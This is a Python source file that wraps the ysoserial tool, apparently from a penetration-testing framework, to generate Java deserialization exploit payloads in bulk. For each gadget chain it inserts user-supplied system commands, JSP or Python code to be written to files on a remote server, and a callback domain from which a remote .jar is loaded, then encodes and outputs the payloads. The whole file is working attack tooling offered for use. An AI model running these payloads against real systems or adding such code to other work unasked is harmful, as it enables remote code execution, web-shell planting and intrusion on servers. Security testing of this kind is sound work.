import re
import logging
import os
import base64
from .serializer import Serializer

class YSOSerial(Serializer):

    usage = 'Y SO SERIAL?'

    specialPayloadFormats = {
        'AspectJWeaver': ['<remote_file>;<base64>'],
        'C3P0': ['<url>:<classname>'],
        'FileUpload1': ['writeB64;<remote_dir>;<base64>', 'writeOldB64;<remote_file>;<base64>'],
        'JRMPClient': ['<domain>'],
        'JRMPListener': ['<remote_port>'],
        'Jython1': ['<local_py_file>;<remote_py_file>'],
        'Myfaces2': ['<url>:<classname>'],
        'URLDNS': ['<url>'],
        'Wicket1': ['writeB64;<remote_dir>;<base64>', 'writeOldB64;<remote_file>;<base64>'],
    }

    maxVersionRequired = {
        'CommonsCollections1': 11,
        'CommonsCollections3': 11,
        'CommonsCollections5': 11,
        'Groovy1': 11,
        'Hibernate2': 11,
        'JRMPClient': 11,
        'JRMPListener': 11,
        'Jdk7u21': 11,
        'JSON1': 8,
        'MozillaRhino1': 11,
        'Spring1': 11,
        'Spring2': 11,
        'Vaadin1': 11,
    }

    def __init__(self, javaPath, jarPath, chainOpts):
        self.javaPath = javaPath
        self.jarPath = jarPath
        self.javaVersion = None
        #javaOpts = "--add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED --add-opens=java.base/java.net=ALL-UNNAMED --add-opens=java.base/java.util=ALL-UNNAMED"
        javaOpts = ""
        bin = f"{javaPath} {javaOpts} -jar {jarPath}"
        super().__init__(bin, chainOpts)

    def exists(self):
        result = super().exists()
        if not result:
            return False
        logging.debug("Checking java binary version")
        binBackup = self.bin
        self.bin = self.javaPath
        versionOut = self.exec('-version 2>&1').split('\n')
        self.bin = binBackup
        pattern = r"version\s+\"(?P<majorVersion>[0-9]+)\.(?P<minorVersion>[0-9]+)\."
        regex = re.compile(pattern)
        for line in versionOut:
            match = regex.search(line.lower())
            if match:
                majorVersion = int(match.groupdict()['majorVersion'])
                minorVersion = int(match.groupdict()['minorVersion'])
                # Exemple of formats depending on OpenJDK or Java flavor
                # openjdk version "17.0.12" 2024-07-16
                # java version "1.8.0_431"
                self.javaVersion = majorVersion if majorVersion > 1 else minorVersion
                logging.info(f"Detected java version: {self.javaVersion}")
                logging.debug(f"Detailed version: {line}")
                break
        
        if self.javaVersion == None:
            self.javaVersion = 11
            logging.warning("Cannot detect java version, setting default to 11, but blindly...")
            logging.warning("\n".join(versionOut))

        if self.javaVersion > 11:
            logging.warning(f"Java version is not <= 11, version detected: {self.javaVersion}.")
            logging.warning("You might having errors generating payloads.")
            logging.warning("It is recommended to install it and use it with --java-path option or use Docker container")
            logging.debug('\n'.join(versionOut))
        return True


    
    def chains(self):
        chainsOutput = self.exec('').split('\n')
        pattern = r"^\s+(?P<name>[\w]+)\s{1,}@.+$"
        regex = re.compile(pattern)
        chains = []
        for line in chainsOutput:
            match = regex.search(line)
            if not match:
                continue
            chain = match.groupdict()
            if chain['name'] == 'Payload': 
                continue

            if chain['name'] in self.specialPayloadFormats:
                formats = self.specialPayloadFormats[chain['name']]
            else:
                formats = ['<system_command>']
            
            chains.append({
                'id': chain['name'].lower(),
                'name': chain['name'],
                'description': f"{chain['name']}: {' | '.join(formats)}",
                'formats': formats,
            })
            
        return chains

    def generate(self, chains):

        if len(chains) == 0:
            return 0

        system_command = self.chainOpts.system_command
        interact_domain = self.chainOpts.interact_domain
        jsp_code = self.getFileContentOrCode(self.chainOpts.jsp_code)
        py_code = self.getFileContentOrCode(self.chainOpts.python_code)
        remote_file_to_write = self.chainOpts.remote_file_to_write
        remote_dir = os.path.dirname(remote_file_to_write)
        remote_port = int(self.chainOpts.remote_port)
        remote_content = self.getFileContentOrCode(self.chainOpts.remote_content) if self.chainOpts.remote_content is not None else jsp_code

        logging.info(f"Interact domain: {interact_domain}")
        logging.info(f"System command: {system_command}")
        logging.info(f"JSP Code: {self.chainOpts.jsp_code}")
        logging.info(f"Python Code: {self.chainOpts.python_code}")
        logging.info(f"File written on remote server: {remote_file_to_write}")
        logging.info(f"Content written on server: {remote_content}")

        # create an empty file that will contain JSP and Python file with the payload
        fp = self.createTemporaryFile(suffix='.jsp')
        pyFp = self.createTemporaryFile(suffix='.py')
        if fp == None or pyFp == None:
            return 0

        logging.info(f"Generating payloads...")
        

        # generate payload for each chain
        count = 0
        for chain in chains:

            for format in chain['formats']:

                if chain['name'] in self.maxVersionRequired and self.javaVersion > self.maxVersionRequired[chain['name']]:
                    logging.warning(f"[{chain['name']}] Skipping payload with because it requires Java version <= {self.maxVersionRequired[chain['name']]}")
                    continue

                if ('<url>' in format or '<domain>' in format) and not interact_domain:
                    logging.warning(f"[{chain['name']}] Skipping payload with format {format} because it requires an interact domain")
                    continue
    
                logging.info(f"[{chain['name']}] Generating payload with format '{format}'")


                chain_system_command = system_command
                chain_system_command = chain_system_command.replace('%%chain_id%%', chain['id'])
                chain_system_command = chain_system_command.replace('%%domain%%', str(interact_domain))
                escaped_chain_system_command = chain_system_command.replace("'", "\\'")

                chain_jsp_code = jsp_code
                chain_jsp_code = chain_jsp_code.replace('%%system_command%%', escaped_chain_system_command)
                chain_jsp_code = chain_jsp_code.replace('%%domain%%', str(interact_domain))
                chain_jsp_code = chain_jsp_code.replace('%%chain_id%%', chain['id'])

                chain_remote_content = remote_content
                chain_remote_content = chain_remote_content.replace('%%system_command%%', escaped_chain_system_command)
                chain_remote_content = chain_remote_content.replace('%%domain%%', str(interact_domain))
                chain_remote_content = chain_remote_content.replace('%%chain_id%%', chain['id'])

                chain_py_code = py_code
                chain_py_code = chain_py_code.replace('%%system_command%%', escaped_chain_system_command)
                chain_py_code = chain_py_code.replace('%%domain%%', str(interact_domain))
                chain_py_code = chain_py_code.replace('%%chain_id%%', chain['id'])

                chainArguments = format
                chainArguments = chainArguments.replace('<base64>', base64.b64encode(chain_remote_content.encode('ascii')).decode('ascii'))
                chainArguments = chainArguments.replace('<local_file>', fp.name)
                chainArguments = chainArguments.replace('<system_command>', chain_system_command)
                chainArguments = chainArguments.replace('<local_py_file>', pyFp.name)
                chainArguments = chainArguments.replace('<remote_file>', remote_file_to_write.replace('%%ext%%', 'jsp'))
                chainArguments = chainArguments.replace('<remote_py_file>', remote_file_to_write.replace('%%ext%%', 'py'))
                chainArguments = chainArguments.replace('<remote_dir>', remote_dir)
                chainArguments = chainArguments.replace('<remote_port>', str(remote_port))
                chainArguments = chainArguments.replace('<classname>', chain['id'])
                chainArguments = chainArguments.replace('<domain>', str(interact_domain))
                chainArguments = chainArguments.replace('<url>', f"https://{interact_domain}/{chain['id']}.jar")
                
                with open(fp.name, mode='w') as ft:
                    ft.write(chain_jsp_code)

                with open(pyFp.name, mode='w') as ft:
                    ft.write(chain_py_code)

                chainArguments = f"'{chainArguments}'"
                result = self.payload(chain['name'], chainArguments)

                if result.returncode != 0:
                    logging.error(f"[{chain['name']}] Failed to create payload")
                    if result.stderr != b'':
                        logging.error(result.stderr.decode('ascii'))
                    if result.stdout != b'':
                        logging.error(result.stdout.decode('ascii'))
                    continue

                payload = result.stdout

                logging.debug(f"[{chain['name']}] Payload generated with {len(payload)} bytes")

                payload = self.encode(payload)
                
                if len(chain['formats']) > 1:
                    chainUniqueId = f"{chain['id']}_{chain['formats'].index(format)}"
                else:
                    chainUniqueId = chain['id']
                self.output(chainUniqueId, payload+b"\n")
                count = count + 1

        # cleanup temp file
        if os.path.exists(fp.name):
            logging.debug(f"Removing temporary file {fp.name}")
            os.remove(fp.name)
        if os.path.exists(pyFp.name):
            logging.debug(f"Removing temporary file {pyFp.name}")
            os.remove(pyFp.name)
                
        return count
